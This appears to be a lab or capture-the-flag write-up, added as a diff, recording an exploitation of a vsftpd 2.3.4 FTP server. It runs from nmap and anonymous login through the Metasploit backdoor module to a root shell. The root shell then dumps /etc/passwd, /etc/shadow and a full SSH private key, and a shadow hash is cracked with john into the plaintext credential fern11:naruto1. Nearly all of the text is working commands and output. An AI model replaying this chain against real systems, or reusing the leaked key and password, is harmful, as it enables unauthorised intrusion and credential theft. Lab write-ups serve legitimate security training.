@@ -1,0 +1,238 @@
+Scans:
+
+NMAP:
+
+sudo nmap -sC -sV -sS 10.10.10.53 -p 21
+[sudo] password for kali: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-19 09:28 EST
+Nmap scan report for 10.10.10.53
+Host is up (0.018s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.0.32
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+Service Info: OS: Unix
+
+==> Anonymous login available
+
+SEARCHSPLOIT:
+> searchsploit vsftpd
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
+
+EXPLOITATION:
+
+anonymous connection:
+
+ftp 10.10.10.53
+Connected to 10.10.10.53.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.53:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> status
+Connected to 10.10.10.53.
+No proxy connection.
+Connecting using address family: any.
+Mode: stream; Type: binary; Form: non-print; Structure: file
+Verbose: on; Bell: off; Prompting: on; Globbing: on
+Store unique: off; Receive unique: off
+Case: off; CR stripping: on
+Quote control characters: on
+Ntrans: off
+Nmap: off
+Hash mark printing: off; Use of PORT cmds: on
+Tick counter printing: off
+ftp> 
+
+vsftpd 2.3.4 is vulnerable with a backdoor (msf>exploit>unix>vsftpd_234_backdoor) :
+msf> use exploit/unix/ftp/vsftpd_234_backdoor
+msf> show options > Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   21               yes       The target port (TCP)
+msf> set RHOSTS 10.10.10.53
+msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 10.10.10.53:21 - The port used by the backdoor bind listener is already open
+[+] 10.10.10.53:21 - UID: uid=0(root) gid=0(root) groups=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (10.10.0.32:36415 -> 10.10.10.53:6200 ) at 2021-12-20 05:56:19 -0500
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+run.sh
+sbin
+srv
+sys
+tmp
+usr
+var
+vsftpd
+
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:107::/var/run/dbus:/bin/false
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+fern11:x:1000:1000::/home/fern11:/bin/bash
+ftp:x:1001:1001::/var/ftp:
+
+cat /etc/shadow
+root:*:18843:0:99999:7:::
+daemon:*:18843:0:99999:7:::
+bin:*:18843:0:99999:7:::
+sys:*:18843:0:99999:7:::
+sync:*:18843:0:99999:7:::
+games:*:18843:0:99999:7:::
+man:*:18843:0:99999:7:::
+lp:*:18843:0:99999:7:::
+mail:*:18843:0:99999:7:::
+news:*:18843:0:99999:7:::
+uucp:*:18843:0:99999:7:::
+proxy:*:18843:0:99999:7:::
+www-data:*:18843:0:99999:7:::
+backup:*:18843:0:99999:7:::
+list:*:18843:0:99999:7:::
+irc:*:18843:0:99999:7:::
+gnats:*:18843:0:99999:7:::
+nobody:*:18843:0:99999:7:::
+systemd-timesync:*:18843:0:99999:7:::
+systemd-network:*:18843:0:99999:7:::
+systemd-resolve:*:18843:0:99999:7:::
+systemd-bus-proxy:*:18843:0:99999:7:::
+_apt:*:18843:0:99999:7:::
+messagebus:*:18969:0:99999:7:::
+sshd:*:18969:0:99999:7:::
+fern11:$6$S9LjqgB/$rtsaXr/.H6R3fM.APrjilamO7.Qx1Sy0aTTOJUxz2JCCZoIgLcsIt0MWkbft5MAM8qtEni0BIDzbhdNiJOOs9/:18969:0:99999:7:::
+ftp:!:18970:0:99999:7:::
+
+cat /etc/fstab
+# UNCONFIGURED FSTAB FOR BASE SYSTEM
+
+cat /etc/hosts
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+10.10.10.53     workstation1101
+
+ls /home/fern11/.ssh
+id_rsa
+id_rsa.pub
+
+cat .ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+cat .ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEIKiv9iVXmMpU7CcbgiB7Bngtd2mlmTay8aPlyM0ZbzF7nFq1mQm/jaIQDQ8ru9df6sI1U+ywaGkdrlIIgHXDB5wqf+PvXGI3vhHe94JfLgdQdXk33Y5IKpTpISRBL9/UqCYsAZNBOd0RWE1eB0nJntZyGtkdm0EP+T0C7em13ExfV1AVrvFrO3nlrB/DaQJ0J42HhvIt6qVGdC/SNbAo0V5M0qkhep28gQLsnKzExBpcrmV8Wu95uUJGhLG03tLQBgqn1rGr+9K5gxrE/QaiHrhUx9vdCz761MLvA64uVUBceHm1Vq+6kTfkOdGT5DASWBw5kiax0MBngP3zjnHMQYjPc03sof6/X3wViwtRxsPnt+pJl+3gwO9Lsy3/kdy1QeB7re1J/X/4UGyj6BAqvdQweCDUjlC5Ja8gjF3hf7aSJJ+rzcm92ydM3aEwmjuE8xSOL1MwLaZRcUJM+BOBA+yzcK+0jqiWZO2yUwaT3AIzLMakprQprDRJV2C6Rd0= root@rancher
+
+CRACK /etc/passwd && /etc/shadow
+
+unshadow passwd.txt shadow.txt > unshadow.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+naruto1          (fern11)     
+1g 0:00:00:01 DONE (2021-12-20 06:30) 0.5208g/s 1266p/s 1266c/s 1266C/s skyblue..longhorns
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+credentials are fern11:naruto1
